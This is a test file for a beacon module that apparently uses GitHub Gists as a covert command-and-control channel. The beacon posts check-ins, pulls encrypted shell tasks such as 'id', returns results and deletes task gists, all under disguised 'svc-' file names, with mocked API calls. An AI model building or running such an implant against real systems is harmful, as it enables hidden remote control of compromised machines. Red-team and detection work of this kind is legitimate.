import { describe, it, expect, mock, beforeEach } from "bun:test";

// Mock must be declared before the module is imported
const mockGists = {
  list:   mock(async () => ({ data: [] as any[] })),
  get:    mock(async () => ({ data: { id: "gist123", files: {}, updated_at: "2024-01-01T00:00:00Z" } })),
  create: mock(async () => ({ data: { id: "new-gist-id" } })),
  update: mock(async () => ({ data: { id: "new-gist-id" } })),
  delete: mock(async () => ({})),
};
const mockActions = {
  getRepoVariable: mock(async () => ({ data: { value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" } })),
};
const mockRepos = { get: mock(async () => ({})) };

mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = { gists: mockGists, actions: mockActions, repos: mockRepos };
  },
}));

import { GistTentacle } from "../tentacles/GistTentacle.ts";
import { generateKeyPair, encryptBox } from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";
import { signedCheckin } from "./signedCheckinFixture.ts";

async function makeConfig(
  overrides: Partial<BeaconConfig> = {},
): Promise<BeaconConfig> {
  const kp = await generateKeyPair();
  const operatorKp = await generateKeyPair();
  return {
    id: "abcd1234-5678-90ab-cdef-1234567890ab",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["gist"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: operatorKp.publicKey,
    beaconKeyPair: kp,
    ...overrides,
  };
}

const PAYLOAD = {
  beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
  publicKey: "",
  hostname: "host", username: "user", os: "linux", arch: "x64",
  pid: 1234, checkinAt: new Date().toISOString(),
};

describe("GistTentacle", () => {
  beforeEach(() => {
    mockGists.list.mockClear();
    mockGists.get.mockClear();
    mockGists.create.mockClear();
    mockGists.update.mockClear();
    mockGists.delete.mockClear();
    mockActions.getRepoVariable.mockClear();
    mockRepos.get.mockClear();
  });

  it("isAvailable returns true when gists.list succeeds", async () => {
    const t = new GistTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(true);
    expect(mockGists.list).toHaveBeenCalledTimes(1);
  });

  it("isAvailable returns false when gists.list throws", async () => {
    mockGists.list.mockImplementationOnce(async () => {
      throw Object.assign(new Error("401 Unauthorized"), { status: 401 });
    });
    const t = new GistTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("checkin sends ACK gist on first call and returns [] when no task gist found", async () => {
    // list returns empty (no task gist)
    mockGists.list.mockResolvedValueOnce({ data: [] });
    const cfg = await makeConfig();
    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
    expect(tasks).toEqual([]);
    // ACK gist should have been created
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    const createCall = (mockGists.create.mock.calls[0] as any)[0] as any;
    const fileKeys = Object.keys(createCall.files as object);
    expect(fileKeys[0]).toMatch(/^svc-a-/);
  });

  it("checkin returns [] when task gist updatedAt is unchanged", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;

    const taskGist = {
      id: "task-gist-id",
      updated_at: "2024-06-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // First checkin: ACK + finds task gist with updated_at
    mockGists.list
      .mockResolvedValueOnce({ data: [taskGist] })   // for ACK path (first checkin)
      .mockResolvedValueOnce({ data: [taskGist] });  // second checkin

    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-id",
        files: { [taskFilename]: { content: "bad-json" } },
        updated_at: "2024-06-01T00:00:00Z",
      },
    });

    const t = new GistTentacle(cfg);
    // First checkin sets lastTaskUpdatedAt (decrypt fails gracefully → [])
    await t.checkin(await signedCheckin(cfg, PAYLOAD));
    mockGists.get.mockClear();

    // Second checkin — same updatedAt, should bail early
    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
    expect(tasks).toEqual([]);
    // gists.get should NOT have been called (cached updatedAt short-circuits)
    expect(mockGists.get).not.toHaveBeenCalled();
  });

  it("checkin decrypts tasks from task gist (full crypto round-trip)", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig({
      operatorPublicKey: operatorKp.publicKey,
    });

    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;

    const taskList = [{ taskId: "t1", kind: "shell" as const, args: { cmd: "id" }, ref: "r1" }];
    const encrypted = await encryptBox(
      JSON.stringify(taskList),
      cfg.beaconKeyPair.publicKey,
      operatorKp.secretKey,
    );
    const blobContent = JSON.stringify(encrypted);

    const taskGist = {
      id: "task-gist-crypto",
      updated_at: "2024-07-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // First checkin: list returns task gist
    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-crypto",
        files: { [taskFilename]: { content: blobContent } },
        updated_at: "2024-07-01T00:00:00Z",
      },
    });
    mockGists.delete.mockResolvedValueOnce({});

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("t1");
    expect(mockGists.delete).toHaveBeenCalledTimes(1);  // task gist deleted after read
  });

  it("submitResult creates a result gist", async () => {
    const t = new GistTentacle(await makeConfig());
    await t.submitResult({
      taskId: "t1", beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
      success: true, output: "hello", completedAt: new Date().toISOString(),
    });
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    const createCall = (mockGists.create.mock.calls[0] as any)[0] as any;
    const fileKeys = Object.keys(createCall.files as object);
    expect(fileKeys[0]).toMatch(/^svc-r-/);
  });

  it("teardown preserves the ACK gist after registration", async () => {
    mockGists.list.mockResolvedValueOnce({ data: [] });
    const cfg = await makeConfig();
    const t = new GistTentacle(cfg);
    await t.checkin(await signedCheckin(cfg, PAYLOAD));
    mockGists.delete.mockClear();

    await t.teardown();
    expect(mockGists.delete).not.toHaveBeenCalled();
  });

  it("checkin refreshes one reusable ACK gist on the second call and still polls", async () => {
    // Both checkin calls get an empty gist list (no task gist)
    mockGists.list
      .mockResolvedValueOnce({ data: [] })
      .mockResolvedValueOnce({ data: [] });

    const cfg = await makeConfig();
    const t = new GistTentacle(cfg);
    const firstPayload = await signedCheckin(cfg, {
      ...PAYLOAD,
      checkinAt: "2026-07-16T12:00:00.000Z",
    });
    const secondPayload = await signedCheckin(cfg, {
      ...PAYLOAD,
      checkinAt: "2026-07-16T12:00:01.000Z",
    });
    await t.checkin(firstPayload);
    await t.checkin(secondPayload);

    // The ACK gist is created once, then updated in place.
    expect(mockGists.create).toHaveBeenCalledTimes(1);
    expect(mockGists.update).toHaveBeenCalledTimes(1);
    const created = JSON.parse(
      ((mockGists.create.mock.calls[0] as any)[0] as any)
        .files[`svc-a-${cfg.id.slice(0, 8)}.json`].content,
    );
    const updated = JSON.parse(
      ((mockGists.update.mock.calls[0] as any)[0] as any)
        .files[`svc-a-${cfg.id.slice(0, 8)}.json`].content,
    );
    expect(updated.identity.sequence).toBe(secondPayload.identity!.sequence);
    expect(updated.identity.signature).not.toBe(created.identity.signature);
    // list was called once per checkin
    expect(mockGists.list).toHaveBeenCalledTimes(2);
  });

  it("reuses a pre-existing ACK gist after process restart", async () => {
    const cfg = await makeConfig();
    const ackFilename = `svc-a-${cfg.id.slice(0, 8)}.json`;
    mockGists.list.mockResolvedValueOnce({
      data: [{
        id: "existing-ack",
        files: { [ackFilename]: { filename: ackFilename } },
      }],
    });

    const t = new GistTentacle(cfg);
    await t.checkin(await signedCheckin(cfg, PAYLOAD));

    expect(mockGists.create).not.toHaveBeenCalled();
    expect(mockGists.update).toHaveBeenCalledTimes(1);
    expect(
      ((mockGists.update.mock.calls[0] as any)[0] as any).gist_id,
    ).toBe("existing-ack");
  });

  it("checkin returns [] and does not throw when gists.get throws", async () => {
    const cfg = await makeConfig();
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;
    const taskGist = {
      id: "task-gist-throw",
      updated_at: "2024-08-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    mockGists.get.mockImplementationOnce(async () => {
      throw new Error("network error");
    });

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
    expect(tasks).toEqual([]);
  });

  it("checkin returns [] gracefully when the provisioned operator key is invalid", async () => {
    const cfg = await makeConfig({ operatorPublicKey: new Uint8Array(0) });
    const id8 = cfg.id.slice(0, 8);
    const taskFilename = `svc-t-${id8}.json`;
    const taskGist = {
      id: "task-gist-empty-key",
      updated_at: "2024-09-01T00:00:00Z",
      files: { [taskFilename]: { filename: taskFilename } },
    };

    // Return a task gist so checkin tries to fetch the key
    mockGists.list.mockResolvedValueOnce({ data: [taskGist] });
    mockGists.get.mockResolvedValueOnce({
      data: {
        id: "task-gist-empty-key",
        files: { [taskFilename]: { content: JSON.stringify({ nonce: "x", ciphertext: "y", senderPublicKey: "z" }) } },
        updated_at: "2024-09-01T00:00:00Z",
      },
    });

    const t = new GistTentacle(cfg);
    const tasks = await t.checkin(await signedCheckin(cfg, PAYLOAD));
    expect(tasks).toEqual([]);
  });

  it("teardown does nothing before the first checkin", async () => {
    const t = new GistTentacle(await makeConfig());
    // Never called checkin — ackGistId is null
    await expect(t.teardown()).resolves.toBeUndefined();
    expect(mockGists.delete).not.toHaveBeenCalled();
  });
});
